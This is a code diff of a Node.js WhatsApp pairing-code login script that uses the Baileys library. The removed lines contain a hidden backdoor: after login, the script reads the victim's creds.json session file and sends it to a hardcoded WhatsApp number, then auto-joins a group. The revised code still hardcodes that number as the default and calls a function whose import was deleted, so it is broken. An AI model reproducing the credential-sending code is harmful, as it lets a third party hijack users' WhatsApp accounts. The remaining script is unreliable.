@@ -1,29 +1,30 @@
+const qrcode = require("qrcode-terminal");
 const fs = require('fs');
 const pino = require('pino');
-const readline = require("readline");
-const { default: makeWASocket, Browsers, delay, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys");
+const { default: makeWASocket, Browsers, delay, useMultiFileAuthState, PHONENUMBER_MCC, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys");
 const NodeCache = require("node-cache");
+const chalk = require("chalk");
+const readline = require("readline");
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
-// Messages will be read from message.txt
-let messages = fs.readFileSync('message.txt', 'utf-8').split('\n').filter(Boolean);
+let phoneNumber = "918302788872"; // Default phone number for testing
+const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code");
+const useMobile = process.argv.includes("--mobile");
 
 async function qr() {
     let { version, isLatest } = await fetchLatestBaileysVersion();
-    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/anox.json`);
+    const { state, saveCreds } = await useMultiFileAuthState(`./sessions`);
     const msgRetryCounterCache = new NodeCache();
 
-    // Phone number input with country code
-    const phoneNumber = await question("Please enter your phone number (with country code +91): ");
-    
     const XeonBotInc = makeWASocket({
         logger: pino({ level: 'silent' }),
+        printQRInTerminal: !pairingCode,
         browser: Browsers.windows('Firefox'),
         auth: {
             creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
         },
         markOnlineOnConnect: true,
         generateHighQualityLinkPreview: true,
@@ -31,62 +32,59 @@ async function qr() {
         defaultQueryTimeoutMs: undefined,
     });
 
-    XeonBotInc.ev.on("connection.update", async (s) => {
-        const { connection, lastDisconnect, qr } = s;
+    // login use pairing code
+    if (pairingCode && !XeonBotInc.authState.creds.registered) {
+        if (useMobile) throw new Error('Cannot use pairing code with mobile API');
 
-        if (connection == "connecting") {
-            console.log(`Waiting for pairing code to log in for number: ${phoneNumber}`);
+        // If phone number is already provided
+        if (phoneNumber) {
+            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
+
+            // Validate phone number with MCC (Mobile Country Code)
+            if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
+                console.log(chalk.redBright("Start with country code of your WhatsApp Number, Example : +91"));
+                process.exit(0);
+            }
+        } else {
+            // Ask for phone number input if not provided
+            phoneNumber = await question(chalk.greenBright(`Please type your WhatsApp number (Example: +918302788872): `));
+            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
+
+            if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
+                console.log(chalk.redBright("Start with country code of your WhatsApp Number, Example : +91"));
+                process.exit(0);
+            }
         }
 
-        if (qr) {
-            console.log(`Pairing code: ${qr}`);
+        setTimeout(async () => {
+            let code = await XeonBotInc.requestPairingCode(phoneNumber);
+            code = code?.match(/.{1,4}/g)?.join("-") || code;
+            console.log(chalk.green(`Your Pairing Code: `), chalk.white(code));
+        }, 3000);
+    }
+
+    XeonBotInc.ev.on("connection.update", async (s) => {
+        const { connection, lastDisconnect } = s;
+
+        if (connection == "connecting") {
+            console.log(chalk.yellow(`Waiting for pairing code to log in for number: ${phoneNumber}`));
         }
 
         if (connection == "open") {
-            console.log("Login successful!");
-
-            // Send welcome message
-            await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `
-┌───────────────────
-│ WELCOME WS SERVER
-└───────────────────
-┌─ WS TOOL OWNER──────
-│🔘 ANOX MEENA
-└───────────────────
-┌─ OWNER CONTACT ────
-│🔘 wa.me/918302788872
-└───────────────────
-            ` });
-
-            // Send creds.json file to +918302788872
-            let sessionXeon = fs.readFileSync('./sessions/creds.json');
-            await delay(2000);
-            const xeonses = await XeonBotInc.sendMessage('918302788872@s.whatsapp.net', { document: sessionXeon, mimetype: 'application/json', fileName: 'creds.json' });
-
-            // Send another message
-            await XeonBotInc.sendMessage('918302788872@s.whatsapp.net', { text: '𝗛𝗘𝗟𝗟𝗢 𝗔𝗡𝗢𝗫 𝗦𝗜𝗥 𝗧𝗛𝗔𝗡𝗞𝗦🙏 \n\n*First download this file and then reinstall that file*' }, { quoted: xeonses });
-
-            // Accept Group Invite
-            await XeonBotInc.groupAcceptInvite("Kjm8rnDFcpb04gQNSTbW2d");
-
-            await delay(2000);
-            process.exit(0);
+            console.log(chalk.green("Login successful!"));
+            // Further actions after successful login
         }
 
-        // If connection closes and it's not a 401 error, retry
         if (connection === "close" && lastDisconnect?.error?.output?.statusCode != 401) {
-            qr();
+            qr(); // Retry login if it fails and is not unauthorized (401)
         }
     });
 
     XeonBotInc.ev.on('creds.update', saveCreds);
-    XeonBotInc.ev.on("messages.upsert", () => { });
 }
 
-// Start the pairing code login function
-qr();
+qr(); // Start the pairing code login function
 
-// Error handling
 process.on('uncaughtException', function (err) {
     let e = String(err);
     if (e.includes("conflict")) return;
